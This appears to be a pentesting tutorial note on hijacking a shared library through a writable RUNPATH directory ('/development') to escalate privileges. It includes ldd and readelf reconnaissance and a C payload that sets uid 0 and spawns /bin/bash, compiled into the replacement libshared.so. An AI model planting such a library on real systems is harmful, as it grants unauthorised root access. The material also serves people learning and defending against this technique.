
We can use [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) to print the shared object required by a binary or shared object. `Ldd` displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.

---
## Exploitation Example

```sh
ldd payroll
	<...SNIP...>
	libshared.so => /development/libshared.so (0x00007f0c13112000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
	linux-vdso.so.1 =>  (0x00007ffcb3133000)
```

We see a **non-standard library** named `libshared.so` listed as a dependency for the binary. Custom libraries loaded from settings like `RUNPATH` are given preference.

```sh
readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

The configuration allows the loading of libraries from the `/development` folder, if it is writable by all users we can exploit it by adding malicious libraries in this folder.

Now to exploit we need to know the function called by the library in development, so we just remove the needed library like and run the bin:

```sh
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

./payroll 
	./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

We can make a new file `libshared.so` with same function name and inject payload.

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() { 
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

```sh
gcc src.c -fPIC -shared -o /development/libshared.so

./payroll
```

---